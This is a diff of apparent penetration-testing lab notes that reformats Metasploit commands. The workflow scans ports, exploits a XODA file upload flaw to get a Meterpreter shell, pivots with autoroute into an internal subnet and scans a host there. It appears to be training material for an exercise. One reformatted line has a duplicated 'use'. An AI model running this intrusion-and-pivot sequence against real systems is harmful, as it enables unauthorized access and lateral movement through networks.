@@ -3,162 +3,69 @@ This document outlines a penetration testing workflow covering initial reconnais
 
 Phase 1: Environment Setup & Port Scanning
 Objective: Set up the Metasploit environment and identify open ports on the target system.
-
 Metasploit Setup
-# Check your local IP (Attacker)
 
-ifconfig
+> ifconfig                                                   # Check your local IP (Attacker)
 # Local IP: 192.86.140.2
 # Target IP: 192.86.140.3
-
-# Start the Metasploit database service
-service postgresql start
-
-# Start Metasploit console
-msfconsole
-
----
-
-Port Scan Execution
-# Check database status
-db_status
-
-# Create a new workspace
-workspace -a port_scan
-
-# Search for a port scanning module
-search portscan
-
-# Select the TCP port scanning auxiliary module
-use auxiliary/scanner/portscan/tcp
-# OR: use 5 (if '5' is the index number)
-
-# View configuration options
-show options
-
-# Set the target IP address
-set RHOSTS 192.86.140.3
-
-# Set the full port range
-set PORTS 1-65535
-
-# Execute the scan
-run
-
-# Return to the main msfconsole prompt
-back
-
----
+> service postgresql start                                   # Start the Metasploit database service
+> msfconsole                                                 # Start Metasploit console
+> db_status                                                  # Check database status
+> workspace -a port_scan                                     # Create a new workspace
+> search portscan                                            # Search for a port scanning module
+> use auxiliary/scanner/portscan/tcp                         # Select the TCP port scanning auxiliary module. # OR: use 5 (if '5' is the index number)
+> show options                                               # View configuration options
+> set RHOSTS 192.86.140.3                                    # Set the target IP address
+> set PORTS 1-65535                                          # Set the full port range
+> run                                                        # Execute the scan
+> back                                                       # Return to the main msfconsole prompt
 
 Phase 2: Exploitation (XODA File Upload)
 Objective: Utilize a web application vulnerability to gain initial access to the target system.
-
 Exploit Configuration
-Bash
 
-# Verify the web application is running (optional check)
-# From Attacker's machine BASH: 
+> curl 192.86.140.3                                           # Verify the web application is running (optional check)
+> search xoda                                                 # Search for the XODA file upload exploit
+> use exploit/unix/webapp/xoda_file_upload                    # Select the exploit module
+> show options                                                # View required options
+> set RHOSTS 192.86.140.3                                     # Set the target IP
+> set TARGETURI /                                             # Set the target web application path Gain Initial Access to the Target System
+> exploit                                                     # Execute exploit
+> shell                                                       # Stabilize shell (if needed after getting a Meterpreter session)
+> /bin/bash -i   
 
-curl 192.86.140.3
-
-# Search for the XODA file upload exploit
-search xoda
-
-# Select the exploit module
-use exploit/unix/webapp/xoda_file_upload
-
-# View required options
-show options
-
-# Set the target IP
-set RHOSTS 192.86.140.3
-
-# Set the target web application path
-set TARGETURI /
-Gain Initial Access to the Target System
-Bash
-
-# Execute exploit
-exploit
-
-# Stabilize shell (if needed after getting a Meterpreter session)
-shell
-/bin/bash -i
 Phase 3: Post-Exploitation & Pivoting
 Objective: Gather system and network information and set up a pivot route to an internal network.
-
 Network Discovery and Shell Management
-Bash
 
-# Network discovery (from the target's shell)
-ifconfig
+> ifconfig                                                      # Network discovery (from the target's shell)
 # eth0 -> 192.86.140.3 (External)
 # eth1 -> 192.113.124.2 (Internal/Pivot Point)
-
-# Background the session (Return to Meterpreter prompt)
-background
-
-# Background the Meterpreter session (Return to msfconsole prompt)
-background
-
-# View active sessions
-sessions
-Internal Network Pivoting
-Bash
-
-# Set up a route through the compromised system (Meterpreter) 
-# to access the internal network (192.113.124.0/24)
-run autoroute -s 192.113.124.0/24
-
-# Execute the routing command
-run
+> background                                                    # Background the session (Return to Meterpreter prompt)
+> background                                                    # Background the Meterpreter session (Return to msfconsole prompt)
+> sessions                                                      # View active sessions
+> run autoroute -s 192.113.124.0/24                             # Internal Network Pivoting--->Set up a route through the compromised system (Meterpreter) to access the internal network (192.113.124.0/24)
+> run                                                           # Execute the routing command
 
 Phase 4: Internal Reconnaissance
 Objective: Scan a host on the newly accessible internal network (192.113.124.3) using the established pivot route.
 
-Internal Port Scan
-Bash
-search portscan 
-
-# Select the TCP port scanning auxiliary module
-use auxiliary/scanner/portscan/tcp
-
-# View options for configuration
-show options
-
-# Set the INTERNAL target IP address 
-set RHOSTS 192.113.124.3 
-# Traffic will route through the compromised host (pivot).
-
-# Execute the internal scan
-run
-
-# Return to the main msfconsole prompt
-back
+> search portscan                                               # Internal Port Scan
+> use auxiliary/scanner/portscan/tcp                            # Select the TCP port scanning auxiliary module
+> show options                                                  # View options for configuration
+> set RHOSTS 192.113.124.3                                      # Set the INTERNAL target IP address
+                                                                # Traffic will route through the compromised host (pivot).
+> run                                                           # Execute the internal scan
+> back                                                          # Return to the main msfconsole prompt
 
 🔍 UDP Port Scanning Module
 Objective: Perform reconnaissance to identify open UDP ports on the external target system.
-
 Metasploit Commands
-Bash
+# Note: 'udp_sweep' is a common auxiliary module for identifying open UDP ports
 
-# Search for UDP port scanning modules in the Metasploit database
-search udp_sweep 
-# Note: 'udp_sweep' is a common auxiliary module for identifying open UDP ports.
-
-# Select the appropriate module (using '0' as an example index from your notes)
-use 0 
-# Highly Recommended: Instead of the index '0', use the full module path
-# e.g., use auxiliary/scanner/udp/udp_sweep
-
-# View required and available configuration options
-show options
-
-# Set the target IP address
-set RHOSTS 192.86.140.3
-
-# Execute the UDP scan
-run
-
-# Return to the main msfconsole prompt
-back
+> search udp_sweep                                               # Search for UDP port scanning modules in the Metasploit database
+> use use auxiliary/scanner/udp/udp_sweep                        # Select the appropriate module
+> show options                                                   # View required and available configuration options
+> set RHOSTS 192.86.140.3                                        # Set the target IP address
+> run                                                            # Execute the UDP scan
+> back                                                           # Return to the main msfconsole prompt
